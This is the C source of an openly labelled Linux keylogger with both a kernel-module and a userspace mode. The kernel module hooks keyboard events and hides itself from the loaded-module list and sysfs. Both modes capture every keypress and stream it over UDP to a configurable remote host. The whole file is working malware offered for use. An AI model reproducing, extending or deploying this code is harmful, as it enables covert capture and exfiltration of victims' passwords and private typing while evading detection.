/**
 * @file 0.c
 * @brief 0 Keylogger
 * @copyright Copyright (C) 2024 Davide Usberti
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

#ifdef __KERNEL__
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <net/sock.h>
#include <linux/syscalls.h>
#else
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <dirent.h>
#include <string.h>
#include <slog.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <errno.h>
#include <arpa/inet.h>
#endif

#include <config.h>

#define NETLINK_USER 31
#define MAX_PAYLOAD 1024
#define PORT 8888

extern ssize_t read_event(int fd, void *buffer, size_t size);

#ifdef __KERNEL__
static struct sock *nl_sk = NULL;
static int pid = 0;

static int kb_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    struct nlmsghdr *nlh;
    struct sk_buff *skb_out;
    char msg[MAX_PAYLOAD];
    int msg_size;
    struct input_event ev;

    if (code == KBD_KEYCODE && param->down) {
        ev.type = EV_KEY;
        ev.code = param->value;
        ev.value = 1;
        
        msg_size = snprintf(msg, MAX_PAYLOAD, "%d", param->value);
        
        if (!pid) return NOTIFY_OK;

        skb_out = nlmsg_new(msg_size + sizeof(struct input_event), 0);
        if (!skb_out) return NOTIFY_OK;

        nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size + sizeof(struct input_event), 0);
        NETLINK_CB(skb_out).dst_group = 0;
        
        memcpy(nlmsg_data(nlh), &ev, sizeof(struct input_event));
        memcpy(nlmsg_data(nlh) + sizeof(struct input_event), msg, msg_size);

        nlmsg_unicast(nl_sk, skb_out, pid);
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = kb_notify
};

static void nl_recv_msg(struct sk_buff *skb) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)skb->data;
    pid = nlh->nlmsg_pid;
}

static struct netlink_kernel_cfg cfg = {
    .input = nl_recv_msg,
};

static int __init klogger_init(void) {
    nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
    if (!nl_sk) {
        printk(KERN_ALERT "Error creating netlink socket.\n");
        return -1;
    }

    register_keyboard_notifier(&nb);
    
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

static void __exit klogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    netlink_kernel_release(nl_sk);
}

module_init(klogger_init);
module_exit(klogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("333revenge");
MODULE_DESCRIPTION("Keyboard Module");

#else

/**
 * @brief Finds the keyboard device path by scanning /dev/input
 * @return Pointer to string containing device path, or NULL if not found
 */
char* find_keyboard_device() {
    DIR *dir;
    struct dirent *ent;
    char path[267];
    char *device_path = NULL;
    
    dir = opendir("/dev/input");
    if (dir == NULL) {
        fprintf(stderr, "Cannot open /dev/input: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    while ((ent = readdir(dir)) != NULL) {
        if (strncmp(ent->d_name, "event", 5) == 0) {
            snprintf(path, sizeof(path), "/dev/input/%s", ent->d_name);
            int fd = open(path, O_RDONLY);
            if (fd != -1) {
                char name[256];
                if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) > 0) {
                    if (strstr(name, "keyboard") != NULL || 
                        strstr(name, "Keyboard") != NULL) {
                        device_path = strdup(path);
                        #ifdef DEBUG
                        slogd("Found keyboard device at %s", path);
                        #endif
                        close(fd);
                        break;
                    }
                }
                close(fd);
            }
        }
    }
    
    closedir(dir);
    return device_path;
}

/**
 * @brief Handles keyboard input in kernel mode using netlink sockets
 */
void handle_kernel_input(void) {
    struct sockaddr_nl src_addr, dest_addr;
    struct nlmsghdr *nlh = NULL;
    struct iovec iov;
    struct msghdr msg;
    int sock_fd, udp_fd;
    struct input_event *ev;
    struct sockaddr_in udp_addr;
    const config_t *cfg;

    if (load_config("config.json") < 0) {
        fprintf(stderr, "Using default configuration\n");
    }
    cfg = get_config();

    sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
    if (sock_fd < 0) {
        perror("Netlink socket creation failed");
        return;
    }

    udp_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_fd < 0) {
        perror("UDP socket creation failed");
        close(sock_fd);
        return;
    }

    memset(&udp_addr, 0, sizeof(udp_addr));
    udp_addr.sin_family = AF_INET;
    udp_addr.sin_port = htons(cfg->port ? cfg->port : DEFAULT_PORT);
    udp_addr.sin_addr.s_addr = inet_addr(cfg->host[0] ? cfg->host : DEFAULT_HOST);

    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid();

    if (bind(sock_fd, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
        perror("Netlink bind failed");
        close(sock_fd);
        close(udp_fd);
        return;
    }

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0;
    dest_addr.nl_groups = 0;

    nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
    memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
    nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;

    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;
    msg.msg_name = (void *)&dest_addr;
    msg.msg_namelen = sizeof(dest_addr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    printf("Kernel mode keylogger started.\nPress CTRL+C to terminate.\n");
    
    while (1) {
        recvmsg(sock_fd, &msg, 0);
        ev = (struct input_event *)NLMSG_DATA(nlh);
        
        if (ev->type == EV_KEY && ev->value == 1) {
            #ifdef DEBUG
            slogd("Key pressed (kernel): %d", ev->code);
            #endif
            
            if (sendto(udp_fd, ev, sizeof(struct input_event), 0,
                      (struct sockaddr *)&udp_addr, sizeof(udp_addr)) < 0) {
                perror("UDP send failed");
            }
            
            printf("Key pressed (kernel): %d\n", ev->code);
        }
    }

    close(udp_fd);
    close(sock_fd);
}

/**
 * @brief Handles keyboard input in userspace mode by reading device directly
 * @param device_path Path to keyboard input device
 */
void handle_userspace_input(const char *device_path) {
    int fd, udp_fd;
    struct input_event ev;
    struct sockaddr_in udp_addr;
    const config_t *cfg;

    if (load_config("config.json") < 0) {
        fprintf(stderr, "Using default configuration\n");
    }
    cfg = get_config();

    fd = open(device_path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "Error opening device %s: %s\n", device_path, strerror(errno));
        return;
    }

    udp_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_fd < 0) {
        perror("UDP socket creation failed");
        close(fd);
        return;
    }

    memset(&udp_addr, 0, sizeof(udp_addr));
    udp_addr.sin_family = AF_INET;
    udp_addr.sin_port = htons(cfg->port ? cfg->port : DEFAULT_PORT);
    udp_addr.sin_addr.s_addr = inet_addr(cfg->host[0] ? cfg->host : DEFAULT_HOST);

    printf("Userspace mode keylogger started on device: %s\nPress CTRL+C to terminate.\n", device_path);

    while (1) {
        ssize_t bytes = read_event(fd, &ev, sizeof(struct input_event));
        if (bytes < (ssize_t)sizeof(struct input_event)) {
            fprintf(stderr, "Error reading event: %s\n", strerror(errno));
            close(fd);
            close(udp_fd);
            exit(EXIT_FAILURE);
        }

        if (ev.type == EV_KEY && ev.value == 1) {
            #ifdef DEBUG
            slogd("Key pressed (userspace): %d", ev.code);
            #endif
            
            if (sendto(udp_fd, &ev, sizeof(struct input_event), 0,
                      (struct sockaddr *)&udp_addr, sizeof(udp_addr)) < 0) {
                perror("UDP send failed");
            }
            
            printf("Key pressed (userspace): %d\n", ev.code);
        }
    }

    close(udp_fd);
    close(fd);
}

/**
 * @brief Main entry point
 * @param argc Argument count
 * @param argv Argument array
 * @return Exit status
 */
int main(int argc, char *argv[]) {
    #ifdef DEBUG
    slog_init("keylogger", SLOG_FLAGS_ALL, 1);
    #endif

    if (argc > 1 && strcmp(argv[1], "--kernel") == 0) {
        handle_kernel_input();
    } else {
        char *device_path = find_keyboard_device();
        if (!device_path) {
            fprintf(stderr, "No keyboard device found\n");
            exit(EXIT_FAILURE);
        }
        handle_userspace_input(device_path);
        free(device_path);
    }

    #ifdef DEBUG
    slog_destroy();
    #endif
    return 0;
}

#endif
